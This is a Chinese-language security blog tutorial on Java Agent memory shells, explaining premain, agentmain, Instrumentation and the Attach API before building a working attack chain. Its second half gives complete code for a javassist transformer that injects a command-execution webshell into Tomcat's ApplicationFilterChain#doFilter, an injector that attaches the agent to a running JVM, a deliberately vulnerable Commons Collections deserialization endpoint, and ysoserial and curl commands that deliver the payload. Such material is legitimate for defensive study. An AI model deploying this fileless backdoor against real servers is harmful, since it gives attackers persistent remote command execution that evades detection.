---
title: JavaAgent内存马
date: 2026-06-30 06:30:50
updated: 2026-06-30 07:04:43
tags:
  - Web
  - 内存马
---
参考：[GitHub - bitterzzZZ/MemoryShellLearn: 分享几个直接可用的内存马，记录一下学习过程中看过的文章](https://github.com/bitterzzZZ/MemoryShellLearn)

[https://xz.aliyun.com/t/9450](https://xz.aliyun.com/t/9450)

[javaagent使用指南 - rickiyang - 博客园](https://www.cnblogs.com/rickiyang/p/11368932.html)

[https://segmentfault.com/a/1190000016601560](https://segmentfault.com/a/1190000016601560)

[https://leokongwq.github.io/2017/12/21/java-agent-instrumentation.html](https://leokongwq.github.io/2017/12/21/java-agent-instrumentation.html)

[Java 安全之Java Agent - nice_0e3 - 博客园](https://www.cnblogs.com/nice0e3/p/14086165.html)

[Java安全学习——内存马 - 枫のBlog](https://goodapple.top/archives/1355)

---

### **0x01 前置知识-Java Agent**

#### **Java Agent 简介**

在 jdk 1.5 之后引入了 java.lang.instrument 包，该包提供了检测 java 程序的 Api，比如用于监控、收集性能信息、诊断问题，**通过 java.lang.instrument 实现的工具我们称之为 Java Agent** ，Java Agent 能够在不影响正常编译的情况下来修改字节码，即动态修改已加载或者未加载的类，包括类的属性、方法

Agent 内存马的实现就是利用了这一特性使其动态修改特定类的特定方法，将我们的恶意方法添加进去

说白了 Java Agent 只是一个 Java 类而已，只不过普通的 Java 类是以 main 函数作为入口点的，Java Agent 的入口点则是 premain 和 agentmain

Java Agent 支持两种方式进行加载：

1.  实现 premain 方法，在启动时进行加载 （该特性在 jdk 1.5 之后才有）

2.  实现 agentmain 方法，在启动后进行加载 （该特性在 jdk 1.6 之后才有）

#### **启动时加载 agent**

从官方文档中可知晓，首先我们必须实现 premain 方法，同时我们 jar 文件的清单（mainfest）中必须要含有 Premain-Class 属性

我们可在命令行利用 **\-javaagent** 来实现启动时加载

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801047382-a613371d-f40b-4933-84e7-046bf85de222.png)

premain 方法顾名思义，会在我们运行 main 方法之前进行调用，即在运行 main 方法之前会先去调用我们 jar 包中 Premain-Class 类中的 premain 方法

接下来我们来看一下 Demo

首先创建一个类，来实现 premain 的这个方法

```javascript
import java.lang.instrument.Instrumentation;

public class DemoTest {
    public static void premain(String agentArgs, Instrumentation inst) throws Exception{
        System.out.println(agentArgs);
        for(int i=0;i<5;i++){
            System.out.println("premain method is invoked!");
        }
    }
}
```

接下来创建 Manifest，这里将其保存为 agent.mf ，一定要含有 Premain-Class 属性

ps：注意这里的 mf 一定要有空行

```javascript
Manifest-Version: 1.0
Premain-Class: DemoTest

```

利用 javac 将 java 文件编译成 class 之后，利用 jar 命令打包，生成我们的 agent.jar

```javascript
jar cvfm agent.jar agent.mf DemoTest.class
```

按照以上步骤我们便可成功生成 agent.jar

然后创建一个普通类作为测试 demo

```javascript
public class Hello {
    public static void main(String[] args) {
        System.out.println("Hello,Java");
    }
}
```

Hello.mf

```javascript
Manifest-Version: 1.0
Main-Class: Hello
```

同样的利用 javac 编译之后打包成 hello.jar

```javascript
jar cvfm hello.jar hello.mf Hello.class
```

至此我们的准备工作已经做完了，最终得到了 agent.jar 和 hello.jar

接下来我们只需要在 `java -jar` 中添加 `-javaagent:agent.jar` 即可在启动时优先加载 agent , 而且可利用如下方式获取传入我们的 agentArgs 参数

```javascript
java -javaagent:agent.jar[=options] -jar hello.jar
```

可以看到我们 agent 中 premain 的代码被优先执行了，同时还获取 到了 agentArgs 参数

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801047565-466d9fcf-3884-412f-ad29-cfbac7fbe4a6.png)

#### **动态修改字节码**

在实现 premain 的时候，我们除了能获取到 agentArgs 参数，还可以获取 Instrumentation 实例，那么 Instrumentation 实例是什么

##### **Instrumentation**

Instrumentation 是 JVMTIAgent（JVM Tool Interface Agent）的一部分，Java agent通过这个类和目标 JVM 进行交互，从而达到修改数据的效果

在 Instrumentation 中增加了名叫 transformer 的 Class 文件转换器，转换器可以改变二进制流的数据

Transformer 可以对未加载的类进行拦截，同时可对已加载的类进行重新拦截，所以根据这个特性我们能够实现动态修改字节码

参考自：[https://xz.aliyun.com/t/9450#toc-5](https://xz.aliyun.com/t/9450#toc-5)

```javascript
public interface Instrumentation {

    // 增加一个 Class 文件的转换器，转换器用于改变 Class 二进制流的数据，参数 canRetransform 设置是否允许重新转换。在类加载之前，重新定义 Class 文件，ClassDefinition 表示对一个类新的定义，如果在类加载之后，需要使用 retransformClasses 方法重新定义。addTransformer方法配置之后，后续的类加载都会被Transformer拦截。对于已经加载过的类，可以执行retransformClasses来重新触发这个Transformer的拦截。类加载的字节码被修改后，除非再次被retransform，否则不会恢复。
    void addTransformer(ClassFileTransformer transformer);

    // 删除一个类转换器
    boolean removeTransformer(ClassFileTransformer transformer);

    // 在类加载之后，重新定义 Class。这个很重要，该方法是1.6 之后加入的，事实上，该方法是 update 了一个类。
    void retransformClasses(Class<?>... classes) throws UnmodifiableClassException;

    // 判断目标类是否能够修改。
    boolean isModifiableClass(Class<?> theClass);

    // 获取目标已经加载的类。
    @SuppressWarnings("rawtypes")
    Class[] getAllLoadedClasses();

    ......
}
```

Instrumentation 提供了 addTransformer，getAllLoadedClasses，retransformClasses 等方法，我们后面由于只用到了这三个所以就只介绍这三个

###### **addTransformer**

addTransformer 方法来用于注册 Transformer，所以我们可以通过编写 ClassFileTransformer 接口的实现类来注册我们自己的转换器

```javascript
// 注册提供的转换器
void addTransformer(ClassFileTransformer transformer)
```

这样当类加载的时候，会进入我们自己的 Transformer 中的 transform 函数进行拦截

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801047660-4d5f008d-a8a1-4dd8-8407-405ef3e47ae6.png)

###### **getAllLoadedClasses**

getAllLoadedClasses 方法能列出所有已加载的 Class，我们可以通过遍历 Class 数组来寻找我们需要重定义的 class

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801047844-3250124f-d280-4d92-bba9-5e2f0bf35cae.png)

运行效果如下：

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801047972-aadec43e-5ad3-4e5b-a580-a7bcefff99c6.png)

###### **retransformClasses**

retransformClasses 方法能对已加载的 class 进行重新定义，也就是说如果我们的目标类已经被加载的话，我们可以调用该函数，来重新触发这个Transformer的拦截，以此达到对已加载的类进行字节码修改的效果

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801048045-7f062c11-0500-4617-b801-81673e32c12a.png)

##### **Demo**

首先利用 addTransformer 注册一个 transformer ，然后创建一个 ClassFileTransformer 抽象类的实现类，然后 override transform 方法

```javascript
import java.lang.instrument.Instrumentation;

public class DemoTest {
    public static void premain(String agentArgs, Instrumentation inst) throws Exception{
        System.out.println(agentArgs);
        for(int i=0;i<5;i++){
            System.out.println("premain method is invoked!");
        }
        // 注册 DefineTransformer 
        inst.addTransformer(new DefineTransformer(),true);
    }
}
```

DefineTransformer

我们可以在 transform 中定义自己的逻辑，这里我只是简单的输出了 className 做一个测试

```javascript
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

// 每当类被加载，就会调用 transform 函数
public class DefineTransformer implements ClassFileTransformer {
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println(className);
        return new byte[0];
    }
}
```

**注意**：如果需要修改已经被JVM加载过的类的字节码，那么还需要设置在 MANIFEST.MF 中添加 Can-Retransform-Classes: true 或 Can-Redefine-Classes: true

```javascript
Can-Retransform-Classes 是否支持类的重新替换
Can-Redefine-Classes 是否支持类的重新定义
```

这两个如果不添加的话，当我们执行的时候是会报错的

```javascript
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Premain-Class: DemoTest
```

当类被加载的时候就会调用 DefineTransformer 中的 transform 方法，然后我们这里的逻辑就是直接输出加载的类的类名

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801048139-fff32059-af57-4ea8-9d64-29fa77f4e1a6.png)

最后利用内存马注入的例子来介绍一下动态修改字节码的一个逻辑

我们需要修改的肯定是我们指定的类中的某个方法，所以我们这里可以借助 javasist 对字节码进行一个扩充（增加自己的方法）

第一个红框处利用 if 做一个判断，即表示我们只对特定的 classname 的字节码进行处理

第二个红框处则是利用 javasist 来对字节码进行一个动态修改，这样的话我们的恶意方法就会被添加到 ApplicationFilterChain#doFilter 方法中了

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801048207-e0ec57d7-47c5-4486-98b3-be0dc71f90ec.png)

#### **启动后加载 agent**

上面介绍的 premain 方法是在 JDK 1.5中提供的，所以在 jdk 1.5 的时候开发者只能在 main 加载之前添加手脚，但是很多时候例如我们内存马注入的情况都是处于 JVM 已运行了的情况，所以上面的方法就不是很有用，不过在 jdk 1.6 中实现了attach-on-demand（按需附着），我们可以使用 Attach API 动态加载 agent ，然而 Attach API 在 tool.jar 中，jvm 启动时是默认不加载该依赖的，需要我们在 classpath 中额外进行指定

启动后加载 agent 通过新的代理操作来实现：agentmain，使得可以在 main 函数开始运行之后再运行

和之前的 premain 函数一样，我们可以编写 agentmain 函数的 Java 类

```javascript
public static void agentmain (String agentArgs, Instrumentation inst)
public static void agentmain (String agentArgs)
```

要求和之前类似，我们需要满足以下条件

1.  必须要实现 agentmain 方法

2.  Jar 文件清单中必须要含有 Premain-Class 属性

在 Java JDK6 以后实现启动后加载 Instrument 的是 Attach api。存在于 com.sun.tools.attach 里面有两个重要的类。

来查看一下该包中的内容，这里有两个比较重要的类，分别是 VirtualMachine 和 VirtualMachineDescriptor，其中我们重点关注 VirtualMachine 类

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801048285-a4f89225-6393-4f35-9739-0dd80f07a937.png)

##### **VirtualMachine**

VirtualMachine 可以来实现获取系统信息，内存dump、现成dump、类信息统计（例如JVM加载的类）。里面配备有几个方法LoadAgent，Attach 和 Detach 。下面来看看这几个方法的作用

**Attach** ：该类允许我们通过给attach方法传入一个jvm的pid(进程id)，远程连接到jvm上

```javascript
VirtualMachine vm = VirtualMachine.attach(v.id());
```

**loadAgent**：向jvm注册一个代理程序agent，在该agent的代理程序中会得到一个Instrumentation实例，该实例可以 在class加载前改变class的字节码，也可以在class加载后重新加载。在调用Instrumentation实例的方法时，这些方法会使用ClassFileTransformer接口中提供的方法进行处理。

**Detach**：从 JVM 上面解除一个代理(agent)

##### **VirtualMachineDescriptor**

VirtualMachineDescriptor 是一个描述[虚拟机](https://cloud.tencent.com/developer/techpedia/1523?from_column=20065&from=20065)的[容器](https://cloud.tencent.com/developer/techpedia/1532?from_column=20065&from=20065)类，配合 VirtualMachine 类完成各种功能。

所以最后我们的注入流程大致如下：

这里借用奶思师傅的图片

通过 VirtualMachine 类的 attach(pid) 方法，可以 attach 到一个运行中的 java 进程上，之后便可以通过 loadAgent(agentJarPath) 来将agent 的 jar 包注入到对应的进程，然后对应的进程会调用agentmain方法。

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801048838-ea8f0780-0241-45fe-8115-51689ea69698.png)

##### **Demo**

编写 AgentMain.java

```javascript
import java.lang.instrument.Instrumentation;

public class AgentMain {
    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
    }
}
```

编写 DefineTransformer.java

```javascript
import java.lang.instrument.ClassFileTransformer;
import java.lang.instrument.IllegalClassFormatException;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer {
    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) throws IllegalClassFormatException {
        System.out.println(className);
        return classfileBuffer;
    }
}
```

创建 jar 文件清单 agentmain.mf

```javascript
Manifest-Version: 1.0
Can-Redefine-Classes: true
Can-Retransform-Classes: true
Agent-Class: AgentMain
```

分别对上面的 java 文件进行编译，然后利用命令行进行打包

```javascript
jar cvfm AgentMain.jar agentmain.mf AgentMain.class DefineTransformer.class
```

至此我们的 AgentMain.jar 就成功生成了

接下来我们需要编写测试类

ps：我这里使用的是mac环境，在mac上安装了的jdk是能直接找到 VirtualMachine 类的，但是在windows中安装的jdk无法找到，如果你遇到这种情况，请手动将你jdk安装目录下：lib目录中的tools.jar添加进当前工程的Libraries中

```javascript
import com.sun.tools.attach.VirtualMachine;
import com.sun.tools.attach.VirtualMachineDescriptor;

import java.util.List;

public class AgentMainDemo {
    public static void main(String[] args) throws Exception{
        String path = "AgentMain.jar的路径";
        List<VirtualMachineDescriptor> list = VirtualMachine.list();
        for (VirtualMachineDescriptor v:list){
            System.out.println(v.displayName());
            if (v.displayName().contains("AgentMainDemo")){
                // 将 jvm 虚拟机的 pid 号传入 attach 来进行远程连接
                VirtualMachine vm = VirtualMachine.attach(v.id());
                // 将我们的 agent.jar 发送给虚拟机 
                vm.loadAgent(path);
                vm.detach();
            }
        }
    }
}
```

执行效果如下：

可以看到成功调用了了 agent.jar，并输出了加载的类名

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801048931-4adbcd3f-131b-44d7-8c90-31ac2b113c78.png)

不过由于 tools.jar 并不会在 JVM 启动的时候默认加载，所以这里利用 URLClassloader 来加载我们的 tools.jar

代码如下：

```javascript
public class TestAgentMain {

    public static void main(String[] args) {
        try{
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            System.out.println(toolsPath.toURI().toURL());
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class<?> MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class<?> MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List<Object> list = (java.util.List<Object>) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM Start..");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                String name = (String) displayName.invoke(o,null);
                System.out.println(name);
                if (name.contains("TestAgentMain")){
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    java.lang.String path = "AgentMain.jar的路径";
                    loadAgent.invoke(vm,new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}
```

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801049025-bcb215b7-7a05-4f9f-bba0-ea1c6d5d9f70.png)

### **0x02 Agent 实现内存马注入**

实验环境：Springboot

前面说到由于实际环境中我们通常遇到的都是已经启动着的，所以 premain 那种方法不合适内存马注入，所以我们这里利用 agentmain 方法来尝试注入我们的内存马

其实在上文中如何动态修改对应类的字节码已提过，所以我们现在第一件事是需要找到对应的类中的某个方法，这个类中的方法需要满足两个要求

1.  该方法一定会被执行

2.  不会影响正常的业务逻辑

#### **寻找关键类**

在前面的几篇文章中我们学习过了 Filter 的内存马，链接：[https://www.yuque.com/tianxiadamutou/zcfd4v](https://www.yuque.com/tianxiadamutou/zcfd4v)

我们知道当我们用户的请求到达Servlet之前，一定会经过 Filter ，以此来对我们的请求进行过滤

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801049091-251cb9f3-142b-4a07-803d-6d11ce06c773.png)

doFilter 函数作用是依次调用 Filter 链上的 Filter，所以 doFilter 函数是一定会被调用的

同时在 ApplicationFilterChain#doFilter 中还封装了我们用户请求的 request 和 response ，那么如果我们能够注入该方法，那么我们不就可以直接获取用户的请求，将执行结果写在 response 中进行返回

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801049220-476ccb26-fce5-4fef-9fc5-54c3367beeec.png)

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801049316-6ce308af-5483-449c-ab01-b280d99ae154.png)

#### **漏洞环境搭建**

首先我们本地需要有一个反序列化漏洞的环境，我这边简单的弄了一个 cc 3.2.1 的利用环境

![](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782801049429-4952c3a7-6c31-4ac7-9436-8fc84cef46ae.png)

代码:

```javascript
package com.vuln.demo.controller;

import org.springframework.stereotype.Controller;
import org.springframework.web.bind.annotation.RequestMapping;
import org.springframework.web.bind.annotation.ResponseBody;

import javax.servlet.http.HttpServletRequest;
import javax.servlet.http.HttpServletResponse;
import java.io.ObjectInputStream;

@Controller
public class CommonsCollectionsVuln {

    @ResponseBody
    @RequestMapping("/cc11")
    public String cc11Vuln(HttpServletRequest request, HttpServletResponse response) throws Exception {
        java.io.InputStream inputStream =  request.getInputStream();
        ObjectInputStream objectInputStream = new ObjectInputStream(inputStream);
        objectInputStream.readObject();
        return "Hello,World";
    }

    @ResponseBody
    @RequestMapping("/demo")
    public String demo(HttpServletRequest request, HttpServletResponse response) throws Exception{
        return "This is OK Demo!";
    }
}
```

在 pom.xml 中添加 cc 的依赖

```javascript
      <dependency>
            <groupId>commons-collections</groupId>

            <artifactId>commons-collections</artifactId>

            <version>3.2.1</version>

        </dependency>

```

至此一个简单的反序列化环境就搭建完成了

#### **反序列化注入**

主要步骤如下：

1.  编写 agent.jar 从而实现 org.apache.catalina.core.ApplicationFilterChain#doFilter 进行字节码修改

2.  利用 cc11 的反序列化漏洞将我们的加载代码打进去，然后使其执行来加载我们的 agent.jar

##### **第一步**

AgentDemo.java

首先注册我们的 DefineTransformer ，然后遍历已加载的 class，如果存在的话那么就调用 retransformClasses 对其进行重定义

```javascript
import java.lang.instrument.Instrumentation;

public class AgentDemo {
    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public static void agentmain(String agentArgs, Instrumentation ins) {
        ins.addTransformer(new DefineTransformer(),true);
        // 获取所有已加载的类
        Class[] classes = ins.getAllLoadedClasses();

        //for(Class cls : classes){
        //    System.out.println("------------------------------------------");
        //    System.out.println("加载类: "+cls.getName());
        //    System.out.println("是否可被修改: "+ins.isModifiableClass(cls));
        //}

        for (Class clas:classes){
            if (clas.getName().equals(ClassName)){
                try{
                    // 对类进行重新定义
                    ins.retransformClasses(new Class[]{clas});
                } catch (Exception e){
                    e.printStackTrace();
                }
            }
        }
    }
}

```

DefineTransformer.java

对 transform 拦截的类进行 if 判断，如果被拦截的 classname 等于 ApplicationFilterChain 的话那么就对其进行字节码动态修改

这里利用 insertBefore ，将其插入到前面，从而减少对原程序的功能破坏

```javascript
import javassist.*;

import java.lang.instrument.ClassFileTransformer;
import java.security.ProtectionDomain;

public class DefineTransformer implements ClassFileTransformer {

    public static final String ClassName = "org.apache.catalina.core.ApplicationFilterChain";

    public byte[] transform(ClassLoader loader, String className, Class<?> classBeingRedefined, ProtectionDomain protectionDomain, byte[] classfileBuffer) {
        className = className.replace("/", ".");
        if (className.equals(ClassName)) {
            System.out.println("Find the Inject Class: " + ClassName);
            ClassPool pool = ClassPool.getDefault();
            try {
                CtClass c = pool.getCtClass(className);
                CtMethod m = c.getDeclaredMethod("doFilter");
                m.insertBefore("javax.servlet.http.HttpServletRequest req =  request;\n" +
                        "javax.servlet.http.HttpServletResponse res = response;\n" +
                        "java.lang.String cmd = request.getParameter(\"cmd\");\n" +
                        "if (cmd != null){\n" +
                        "    try {\n" +
                        "        java.io.InputStream in = Runtime.getRuntime().exec(cmd).getInputStream();\n" +
                        "System.out.println(\"hahhahahahah\");\n" +
                        "        java.io.BufferedReader reader = new java.io.BufferedReader(new java.io.InputStreamReader(in));\n" +
                        "        String line;\n" +
                        "        StringBuilder sb = new StringBuilder(\"\");\n" +
                        "        while ((line=reader.readLine()) != null){\n" +
                        "            sb.append(line).append(\"\\n\");\n" +
                        "        }\n" +
                        "        response.getOutputStream().print(sb.toString());\n" +
                        "        response.getOutputStream().flush();\n" +
                        "        response.getOutputStream().close();\n" +
                        "        return;\n" +// 处理完命令后，直接 return，不要继续调用过滤器链
                        "    } catch (Exception e){\n" +
                        "        e.printStackTrace();\n" +
                        "    }\n" +
                        "}");
                byte[] bytes = c.toBytecode();
                // 将 c 从 classpool 中删除以释放内存
                c.detach();
                return bytes;
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
        return new byte[0];
    }
}
```

利用 maven 进行打包

`mvn assembly:single`

至此我们的 agent.jar 就编写完毕了

> 踩坑：
> 
> 打包内容包含AgentDemo与DefineTransformer即可，AgentMain不需要包含进去)
> 
> 在我的环境中通过assembly:single来打包jar会丢失项目自身 class 文件  
> 可通过命令jar tvf /target/demoAgent-0.0.1-SNAPSHOT-jar-with-dependencies.jar | grep AgentDemo来判断
> 
> 解决：  
> 通过使用package来打包jar

##### **第二步**

将我们的代码通过 cc11 进行反序列化打进去

在上一步，我们将 agent.jar 已经编写好了，接下来我们需要编写 java 代码来使其加载进去

大致思路为获取到 jvm 的 pid 号之后，调用 loadAgent 方法将 agent.jar 注入进去

```javascript
import com.sun.tools.attach.*;

import java.io.IOException;

public class AgentMain {
    public static void main(String[] args) throws IOException, AttachNotSupportedException, AgentLoadException, AgentInitializationException {
        try{
            java.lang.String path = "/Users/bigcolaxd/work/JavaMem/demoAgent/target/demoAgent-0.0.1-SNAPSHOT-jar-with-dependencies.jar";
            java.io.File toolsPath = new java.io.File(System.getProperty("java.home").replace("jre","lib") + java.io.File.separator + "tools.jar");
            java.net.URL url = toolsPath.toURI().toURL();
            java.net.URLClassLoader classLoader = new java.net.URLClassLoader(new java.net.URL[]{url});
            Class/*<?>*/ MyVirtualMachine = classLoader.loadClass("com.sun.tools.attach.VirtualMachine");
            Class/*<?>*/ MyVirtualMachineDescriptor = classLoader.loadClass("com.sun.tools.attach.VirtualMachineDescriptor");
            java.lang.reflect.Method listMethod = MyVirtualMachine.getDeclaredMethod("list",null);
            java.util.List/*<Object>*/ list = (java.util.List/*<Object>*/) listMethod.invoke(MyVirtualMachine,null);

            System.out.println("Running JVM list ...");
            for(int i=0;i<list.size();i++){
                Object o = list.get(i);
                java.lang.reflect.Method displayName = MyVirtualMachineDescriptor.getDeclaredMethod("displayName",null);
                java.lang.String name = (java.lang.String) displayName.invoke(o,null);
                // 列出当前有哪些 JVM 进程在运行
                System.out.println(name);
                // 这里的 if 条件根据实际情况进行更改
                if (name.contains("org.example.springdemo.SpringdemoApplication")){
                    // 获取对应进程的 pid 号
                    java.lang.reflect.Method getId = MyVirtualMachineDescriptor.getDeclaredMethod("id",null);
                    java.lang.String id = (java.lang.String) getId.invoke(o,null);
                    System.out.println("id >>> " + id);
                    java.lang.reflect.Method attach = MyVirtualMachine.getDeclaredMethod("attach",new Class[]{java.lang.String.class});
                    java.lang.Object vm = attach.invoke(o,new Object[]{id});
                    java.lang.reflect.Method loadAgent = MyVirtualMachine.getDeclaredMethod("loadAgent",new Class[]{java.lang.String.class});
                    loadAgent.invoke(vm,new Object[]{path});
                    java.lang.reflect.Method detach = MyVirtualMachine.getDeclaredMethod("detach",null);
                    detach.invoke(vm,null);
                    System.out.println("Agent Inject Success !!");
                    break;
                }
            }
        } catch (Exception e){
            e.printStackTrace();
        }
    }
}

```

##### 效果实现

这里直接利用之前修改过的 ysoserial 来快速生成反序列化 payload，地址：[https://github.com/KpLi0rn/ysoserial](https://github.com/KpLi0rn/ysoserial)

将上面的代码保存下来，然后在 codefile: 后指定路径即可快速生成

```javascript
java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections11 codefile:./TestAgentMain.java > cc11demo.ser
```

利用 curl 直接打过去

```javascript
curl -v "http://localhost:8080/cc11" --data-binary "@./cc11demo.ser"
```

可以看到控制台出现如下语句，说明注入成功了

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782802668242-5d89553c-cddc-4645-bda9-14b3fcfc0621.png)

成功进行了回显，至此我们的内存马就注入完毕了

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782802648580-6052708e-0cfb-499a-8765-2c0aad6d7fff.png)

目标web服务日志：

![image.png](https://cdn.nlark.com/yuque/0/2026/png/39170111/1782802691706-60264072-3851-4ccd-93b5-685ee607f90e.png)